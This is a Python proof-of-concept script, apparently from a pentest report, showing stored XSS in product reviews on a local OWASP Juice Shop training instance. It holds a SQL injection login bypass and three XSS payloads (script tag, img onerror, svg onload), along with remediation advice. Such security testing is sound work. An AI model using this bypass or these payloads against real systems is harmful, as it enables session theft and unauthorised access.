"""
F-002: Stored XSS in OWASP Juice Shop - Product Reviews
Target: http://localhost:3000
CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)
Severity: HIGH (CVSS 3.1: 7.4)
"""
import ast
import json
import urllib.request
import urllib.error
import sys


TARGET = "http://localhost:3000"


def get_token(base_url: str) -> str:
    """Obtain JWT via SQL injection authentication bypass."""
    payload = json.dumps({"email": "' OR 1=1--", "password": "x"}).encode()
    req = urllib.request.Request(
        f"{base_url}/rest/user/login",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as r:
        data = json.loads(r.read())
    return data["authentication"]["token"]


def post_xss_review(base_url: str, token: str, product_id: int, payload: str, author: str) -> dict:
    """Store an XSS payload as a product review."""
    body = json.dumps({"message": payload, "author": author}).encode()
    req = urllib.request.Request(
        f"{base_url}/rest/products/{product_id}/reviews",
        data=body,
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
        },
        method="PUT",
    )
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())


def read_reviews(base_url: str, product_id: int) -> list:
    """Fetch all reviews for a product."""
    with urllib.request.urlopen(f"{base_url}/rest/products/{product_id}/reviews") as r:
        return json.loads(r.read()).get("data", [])


def verify_payload_stored(reviews: list, author: str, payload: str) -> bool:
    """Check that the XSS payload is stored verbatim (unescaped)."""
    for review in reviews:
        if review.get("author") == author and review.get("message") == payload:
            return True
    return False


def run_poc():
    print("[*] F-002 - Stored XSS PoC: OWASP Juice Shop Product Reviews")
    print(f"[*] Target: {TARGET}")
    print()

    # Step 1: Authenticate
    print("[*] Step 1: Obtaining JWT via SQLi bypass...")
    token = get_token(TARGET)
    print(f"[+] Token obtained: {token[:40]}...")
    print()

    # Step 2: Test payloads
    test_cases = [
        {
            "product_id": 10,
            "payload": "<script>alert(document.cookie)</script>",
            "author": "poc-script-tag",
            "description": "Classic <script> tag (Stored XSS)",
        },
        {
            "product_id": 11,
            "payload": "<img src=x onerror=alert(document.domain)>",
            "author": "poc-img-onerror",
            "description": "img onerror event handler (Stored XSS)",
        },
        {
            "product_id": 12,
            "payload": "<svg onload=alert('XSS:'+document.domain)>",
            "author": "poc-svg-onload",
            "description": "SVG onload event handler (Stored XSS)",
        },
    ]

    results = []
    for tc in test_cases:
        print(f"[*] Step 2: Testing payload: {tc['description']}")
        print(f"    Product ID: {tc['product_id']}")
        print(f"    Payload: {tc['payload']}")

        # Post the review
        post_resp = post_xss_review(
            TARGET, token, tc["product_id"], tc["payload"], tc["author"]
        )
        print(f"    POST response: {post_resp}")

        # Read back and verify
        reviews = read_reviews(TARGET, tc["product_id"])
        stored = verify_payload_stored(reviews, tc["author"], tc["payload"])

        status = "[VULNERABLE] STORED UNESCAPED" if stored else "[SAFE] payload not found or escaped"
        print(f"    Result: {status}")
        print()

        results.append({"tc": tc, "stored": stored})

    # Step 3: Summary
    print("=" * 60)
    print("[*] SUMMARY")
    print("=" * 60)
    vulnerable_count = sum(1 for r in results if r["stored"])
    print(f"[+] Vulnerable payloads: {vulnerable_count}/{len(results)}")
    print()
    print("[!] IMPACT:")
    print("    - Any authenticated user can store JavaScript in product reviews.")
    print("    - The payload executes in the browser of every user who views the product.")
    print("    - Attacker can steal session cookies, perform CSRF, or exfiltrate data.")
    print()
    print("[*] REMEDIATION:")
    print("    1. HTML-encode all user-supplied content before rendering (e.g., DOMPurify).")
    print("    2. Implement Content-Security-Policy (CSP) with strict-dynamic / nonce.")
    print("    3. Validate and reject HTML tags server-side before persistence.")

    if vulnerable_count == 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    # Validate syntax
    with open(__file__) as f:
        ast.parse(f.read())
    run_poc()
